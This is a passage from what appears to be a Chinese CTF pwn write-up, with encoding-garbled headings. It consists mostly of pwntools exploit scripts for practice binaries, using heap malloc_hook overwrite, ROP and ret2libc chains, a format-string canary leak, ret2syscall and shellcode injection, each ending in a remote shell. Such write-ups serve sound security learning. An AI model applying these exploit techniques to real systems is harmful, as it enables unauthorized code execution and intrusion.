class="hljs-string">'./easychunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">'Content of Emo!:\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>    dem = <span class="hljs-string">"hello,everyone.Welcome to:Polar D&amp;N:"</span><br>    p.recvuntil(<span class="hljs-string">'Where are you from?\n'</span>)<br>    p.sendline(dem)<br>    <span class="hljs-comment">#ç”³è¯·å‡ ä¸ªchunk</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"bbbb"</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"cccc"</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"dddd"</span>) <span class="hljs-comment">#3</span><br><br>    <span class="hljs-comment">#freeæ‰chunk0</span><br>    delete(<span class="hljs-number">0</span>) <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#é€šè¿‡ç¼–è¾‘chunk1æº¢å‡ºchunk2çš„sizeçš„inuesä½ä¸º0,æ³¨æ„chunk2çš„prevsizeä½ä¸ºchunk0size+chunk2size</span><br>    pay0 = <span class="hljs-string">'a'</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0x200</span>)<br>    edit(<span class="hljs-number">1</span>,pay0)<br>    delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2</span><br><br>    <span class="hljs-comment">#æ³„éœ²libc</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    show(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">'content:\n'</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br>    <span class="hljs-comment">#print("main_arena88",hex(main_arena))</span><br>    libc_base = main_arena - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base"</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc_hook = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br><br>    one_gadget = libc_base + one[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-comment">#ä¿®æ”¹chunk1çš„fdæ”¹ä¸ºmalloc_hook - 0x23</span><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'aaa'</span>) <span class="hljs-comment">#2-&gt;1</span><br>    delete(<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">1</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#2</span><br><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>) + p64(one_gadget) + p64(realloc_hook+<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>,payload)<br><br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.interactive()<br><br>connect()<br>pwn()<br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#æ³¨é‡Šä¸ºæš´åŠ›è°ƒæ ˆ,å¾—å‡ºi = 1, j = 8</span><br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br><br></code></pre></td></tr></tbody></table></figure><h2 id="fish"><a href="#fish" class="headerlink" title="fish"></a>fish</h2><h3 id="ç¨‹åºä¿æŠ¤-3"><a href="#ç¨‹åºä¿æŠ¤-3" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>å‡½æ•°å­˜åœ¨getsï¼Œæº¢å‡ºæ§åˆ¶è¿”å›åœ°å€ä¸ºbssæ®µä¸Šå†æ‰§è¡Œä¸€æ¬¡getsã€‚ç›´æ¥æº¢å‡ºè¾“å…¥system(â€œ/bin/shâ€)</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2060</span>)<br><span class="hljs-comment">#p = process('./fish')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./fish'</span>)<br>sys = elf.plt[<span class="hljs-string">'system'</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys))<br>get_plt = elf.plt[<span class="hljs-string">'gets'</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(get_plt))<br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>bss = <span class="hljs-number">0x0804A040</span><br>p.sendline(<span class="hljs-string">"123"</span>)<br>payload = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x112</span> + p32(get_plt) + p32(sys) + p32(bss) + p32(bss)<br>p.recvuntil(<span class="hljs-string">b'How many fish does the kitten eat\n'</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b'/bin/sh'</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="format-ret2libc"><a href="#format-ret2libc" class="headerlink" title="format_ret2libc"></a>format_ret2libc</h2><h3 id="ç¨‹åºä¿æŠ¤-4"><a href="#ç¨‹åºä¿æŠ¤-4" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-4"><a href="#è§£é¢˜æ€è·¯-4" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ret2libc</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2107</span>)<br><span class="hljs-comment">#p = process('./format_ret2libc')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br>elf = ELF(<span class="hljs-string">'./format_ret2libc'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x40084B</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400943</span><br><br>payload1 = <span class="hljs-string">"%39$p"</span><br><span class="hljs-comment">#p.recvuntil("Say some words\n")</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">"0x"</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><h3 id="ç¨‹åºä¿æŠ¤-5"><a href="#ç¨‹åºä¿æŠ¤-5" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-5"><a href="#è§£é¢˜æ€è·¯-5" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ret2libc</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2064</span>)<br><span class="hljs-comment">#p = process('./Game')</span><br>elf = ELF(<span class="hljs-string">'./Game'</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>main_addr = elf.symbols[<span class="hljs-string">'main'</span>]<br>start = <span class="hljs-number">0x080485F4</span><br><br>offset = <span class="hljs-number">0x64</span> + <span class="hljs-number">8</span> + <span class="hljs-number">4</span><br><br>p.recvuntil(<span class="hljs-string">'Do you play game?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">'Do you think playing games will affect your learning?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload = <span class="hljs-string">b'a'</span>*offset + p32(puts_plt) + p32(start) + p32(puts_got)<br><span class="hljs-comment">#payload = p32(puts_got)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">'\n'</span>)<br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>log.info(<span class="hljs-string">'puts -&gt; %x'</span>,puts_addr)<br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x05f150</span><br>system_addr = libc + <span class="hljs-number">0x03a950</span><br>binsh_addr = libc + <span class="hljs-number">0x15912b</span><br><br><br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload2 = <span class="hljs-string">b'a'</span>* offset + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="name4"><a href="#name4" class="headerlink" title="name4"></a>name4</h2><h3 id="ç¨‹åºä¿æŠ¤-6"><a href="#ç¨‹åºä¿æŠ¤-6" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-6"><a href="#è§£é¢˜æ€è·¯-6" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ç»•è¿‡æ£€æŸ¥çš„shellcode</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2116</span>)<br><span class="hljs-comment">#p = process('./name4')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./name4'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"Enter your name:\n"</span>)<br>p.sendline(<span class="hljs-string">'\x00'</span>+shellcode)<br>goal = <span class="hljs-number">0x0804A0E0</span><br>goal1 = <span class="hljs-number">0x0804A080</span> + <span class="hljs-number">1</span><br>p.recvuntil(<span class="hljs-string">'Enter your best friend name:\n'</span>)<br>p.sendline(shellcode)<br><br>p.recvuntil(<span class="hljs-string">'give you stack overflow:\n'</span>)<br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0xdeadbeff</span>) + p32(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="play"><a href="#play" class="headerlink" title="play"></a>play</h2><h3 id="ç¨‹åºä¿æŠ¤-7"><a href="#ç¨‹åºä¿æŠ¤-7" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-7"><a href="#è§£é¢˜æ€è·¯-7" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>é€šè¿‡å¾€bssæ®µä¸Šå†™shellcodeå†è·³è½¬æ‰§è¡Œ</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2063</span>)<br><span class="hljs-comment">#p = process('./play')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./play'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"I think you must enjoy playing.\n"</span>)<br>p.sendline(shellcode)<br>goal = <span class="hljs-number">0x6010A0</span><br>p.recvuntil(<span class="hljs-string">'Name your favorite game?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="ç¨‹åºä¿æŠ¤-8"><a href="#ç¨‹åºä¿æŠ¤-8" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-8"><a href="#è§£é¢˜æ€è·¯-8" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ret2syscall 32ä½çš„æ‰§è¡Œ (0xbï¼Œ0ï¼Œ0ï¼Œbinsh) å†è°ƒç”¨80å·ä¸­æ–­</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#p = process('./ret2syscall_32')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./ret2syscall_32'</span>)<br><br>offset = <span class="hljs-number">0x208</span> + <span class="hljs-number">4</span><br>binsh_addr = <span class="hljs-number">0x080EA068</span><br>pop_eax = <span class="hljs-number">0x080b8576</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806f250</span><br>int80_addr = <span class="hljs-number">0x0806cea3</span><br><br>payload = <span class="hljs-string">b'a'</span>*offset + p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += 